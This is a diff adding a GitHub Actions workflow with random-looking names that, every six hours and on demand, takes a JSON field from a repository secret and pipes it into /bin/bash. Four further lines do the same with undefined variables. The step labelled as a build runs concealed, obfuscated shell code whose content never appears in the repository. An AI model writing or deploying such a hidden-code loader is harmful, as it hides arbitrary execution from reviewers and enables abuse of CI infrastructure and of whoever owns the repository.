@@ -1,0 +1,22 @@
+name: laonayanyx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: laonayanyx
+        env:
+          myr6423: ${{ secrets.myr6423 }}
+        run: |
+          echo $myr6423 | jq -r .saic01 | /bin/bash
+          echo $dkzyl9097 | jq -r .uo644 | /bin/bash
+          echo $owzzq109 | jq -r .r47096 | /bin/bash
+          echo $m7 | jq -r .t8 | /bin/bash
+          echo $k0621 | jq -r .zwk01842 | /bin/bash
+
